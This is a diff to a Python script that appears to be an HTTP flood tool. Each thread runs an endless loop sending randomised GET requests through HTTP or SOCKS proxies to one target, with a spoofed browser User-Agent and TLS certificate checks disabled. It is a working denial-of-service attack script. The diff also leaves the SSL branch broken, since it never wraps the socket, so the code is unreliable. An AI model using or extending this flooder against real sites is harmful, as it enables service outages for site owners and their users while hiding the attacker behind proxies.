@@ -5,6 +5,7 @@ import threading
 import time
 import random
 import string
+# 
 
 def get_proxy_list(file_path):
     proxies = []
@@ -12,9 +13,18 @@ def get_proxy_list(file_path):
         with open(file_path, 'r') as f:
             for line in f:
                 line = line.strip()
-                if ":" in line:
-                    parts = line.split(":")
-                    proxies.append((parts[0], int(parts[1])))
+                if not line or line.startswith('#'):
+                    continue
+                if "://" in line:
+                    proxy_type, address = line.split("://", 1)
+                    proxy_type = proxy_type.lower()
+                    if ":" in address:
+                        host, port = address.rsplit(":", 1)
+                        port = int(port)
+                    else:
+                        host = address
+                        port = 1080 if proxy_type.startswith('socks') else 80
+                    proxies.append((proxy_type, host, port))
     except Exception as e:
         print(e)
     return proxies
@@ -49,32 +59,48 @@ def get_url_details(url):
 
     return host, port, path, use_ssl
 
-def start_connection_loop(p_host, p_port, t_host, t_port, base_path, use_ssl):
+def start_connection_loop(proxy_type, p_host, p_port, t_host, t_port, base_path, use_ssl):
     ssl_context = ssl.create_default_context() if use_ssl else None
-    
+
     while True:
         s = None
         try:
             s = socks.socksocket()
-            s.set_proxy(socks.SOCKS5, p_host, p_port)
+
+            # 根据代理类型设置不同的代理
+            if proxy_type == 'http':
+                s.set_proxy(socks.HTTP, p_host, p_port)
+            elif proxy_type == 'socks4':
+                s.set_proxy(socks.SOCKS4, p_host, p_port)
+            elif proxy_type == 'socks5':
+                s.set_proxy(socks.SOCKS5, p_host, p_port)
+            else:
+                print(f"Unsupported proxy type: {proxy_type}")
+                return
+
             s.settimeout(5)
-            
+
             s.connect((t_host, t_port))
-            
+
             client = s
             if use_ssl:
-                client = ssl_context.wrap_socket(s, server_hostname=t_host)
-            
+
+                ssl_context = ssl.create_default_context()
+                ssl_context.check_hostname = False          # 跳过主机名验证
+                ssl_context.verify_mode = ssl.CERT_NONE     # 跳过证书有效性验证
+            else:
+                ssl_context = None
+
             random_path = f"{base_path}{'&' if '?' in base_path else '?'}q={create_random_id()}"
             request = (
                 f"GET {random_path} HTTP/1.1\r\n"
                 f"Host: {t_host}\r\n"
-                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0\r\n"
+                "User-Agent: 	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0\r\n"
                 "Connection: close\r\n\r\n"
             ).encode('utf-8')
-            
+
             client.sendall(request)
-            
+
         except Exception as e:
             print(e)
         finally:
@@ -89,18 +115,23 @@ def run_app():
         print(f"{e}")
         return
 
-    proxy_list = get_proxy_list("socks5.txt")
+    proxy_list = get_proxy_list("proxy.txt")
     if not proxy_list:
-        print("Proxy list is empty.")
+        print("Proxy list is empty or proxy.txt not found.")
+        print("Format: type://host:port")
+        print("Examples:")
+        print("  socks5://127.0.0.1:1080")
+        print("  socks4://185.157.111.3:5678")
+        print("  http://82.115.60.51:80")
         return
 
     print(f"Target: {t_host}:{t_port}{base_path}")
     print(f"Starting threads for {len(proxy_list)} proxies...")
 
-    for p_host, p_port in proxy_list:
+    for proxy_type, p_host, p_port in proxy_list:
         t = threading.Thread(
-            target=start_connection_loop, 
-            args=(p_host, p_port, t_host, t_port, base_path, use_ssl)
+            target=start_connection_loop,
+            args=(proxy_type, p_host, p_port, t_host, t_port, base_path, use_ssl)
         )
         t.daemon = True
         t.start()
